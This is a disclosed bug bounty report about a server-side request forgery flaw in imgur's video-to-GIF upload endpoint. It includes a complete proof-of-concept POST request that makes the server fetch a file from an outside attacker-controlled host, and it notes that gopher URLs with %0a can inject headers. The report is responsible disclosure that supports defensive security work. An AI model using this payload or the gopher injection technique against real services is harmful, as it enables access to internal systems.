# SSRF in imgur video GIF conversion

## Report Details
- **Report ID**: 247680
- **URL**: https://hackerone.com/reports/247680
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-07-10T11:16:05.097Z
- **Disclosed**: 2020-08-13T10:15:10.018Z

## Reporter
- **Username**: mariuszdeepsec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: imgur

## Vulnerability Information
Hi,

There was issue in -> https://hackerone.com/reports/115748

We have found similar one but in next steps

Affected request
============================
```
POST /vidgif/upload HTTP/1.1
Host: imgur.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://imgur.com/vidgif/video/between/56.72/9.71?url=http%3A%2F%2Fwww.onirikal.com%2Fvideos%2Fmp4%2Fbattle_games.mp4
Content-Length: 127
Cookie: SESSIONDATA=%7B%22sessionCount%22%3A3%2C%22sessionTime%22%3A1499684317408%7D; IMGURUIDJAFO=7450708ff93583b3772a3048e340856d59cef648c4dab74c825a83be56c807ab; _ga=GA1.2.1311247514.1499605938; _gid=GA1.2.2061092166.1499605938; __qca=P0-831392639-1499605938609; expPLAT51a=control; AZUSER=ue1-50873ccaac994527ac520cd62b5901e7; __gads=ID=1eb1b9c53a665ffd:T=1499605915:S=ALNI_MaUwqVKMDz-uAhHuqAQFc2_ajTK2Q; m_sort=viral; m_window=day; m_section=hot; __utma=247341212.1311247514.1499605938.1499607069.1499674066.2; __utmz=247341212.1499607069.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); c_sort=newest; c_window=day; __atuvc=2%7C28; GCS=top; authautologin=17d1c9dc6b5e4b318c27ca4b85921a90%7EVJ3S8CJDeJgyKiUlrdYxGzQ99xkZiEox; _nc=1; f_sort=newest; f_section=favorites; retina=0; OX_plg=swf|shk|pm; UPSERVERID=upload.i-083e69b6391b5191e.production; __utmc=247341212; IMGURSESSION=5c493a419036f493aa69b0b40d8b1f28; __cfduid=d5d1746c7fcc97ff5c333cae83ce89d571499673731; showComments=1; c1069960587=1
Connection: close

source=http%3A%2F%2F192.166.218.53%2Fmalicious123.php&url=http%3A%2F%2F192.166.218.53%2Fmalicious123.php&start=56.72&stop=66.43
```


PoC
======================
HTTP Requests
-------------------------
{F201616}
FTP Requests
-------------------------
{F201614}


And most important like in the old vulnerable spot gopher where attacker have posibilities to inject stuff in headers with usse of %0a
-------------------------
{F201615}

Sorry for short description i assume u already know what SSRF is as u fixed previous vulnerable spot, if something is not clear feel free to ask
-------------------------------------------------

## Attachments
- ftp.png
- gopher.png
- http.png
